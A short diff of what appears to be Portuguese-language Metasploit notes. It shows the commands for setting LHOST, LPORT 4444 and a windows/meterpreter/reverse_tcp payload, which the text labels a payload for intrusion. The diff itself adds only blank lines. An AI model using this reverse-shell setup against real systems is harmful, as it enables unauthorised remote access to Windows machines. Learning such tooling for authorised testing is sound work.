@@ -223,5 +223,7 @@ PAYLOAD : Payload para invasão
 # Como setar? 
 
 SET LHOST 192.168.?.?
+
 SET LPORT 4444
+
 SET PAYLOAD windows/meterpreter/reverse_tcp
